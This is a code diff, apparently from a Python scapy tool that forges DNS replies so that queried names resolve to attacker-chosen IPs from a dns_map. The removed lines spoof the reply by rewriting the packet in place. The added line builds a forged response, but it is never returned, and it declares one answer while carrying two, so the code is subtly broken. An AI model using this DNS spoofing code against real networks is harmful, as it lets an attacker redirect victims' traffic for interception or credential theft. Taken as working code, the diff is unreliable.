@@ -89,16 +89,8 @@ def modify_packet2(packet):
         iPrint("no modification:", qname)
         return packet
     #We set the answerfield of the response to our own IP-addres
-    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_map[qname])
-    packet[DNS].ancount = 1
-    packet[IP].src, packet[IP].dst = packet[IP].dst, packet[IP].src
-    packet[Ether].src, packet[Ether].dst = packet[Ether].dst, packet[Ether].src
-    #We remove all lengths and checksums as they are no longer correct and scapy will set the correct values automatically
-    del packet[IP].len
-    del packet[IP].chksum
-    del packet[UDP].len
-    del packet[UDP].chksum
 
+    spf_resp = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=qname, rdata=dns_map[qname])/DNSRR(rrname=qname, rdata=dns_map[qname]))
     iPrint("Modified:", qname)
     #Return the packet with the modified resonse
     return packet
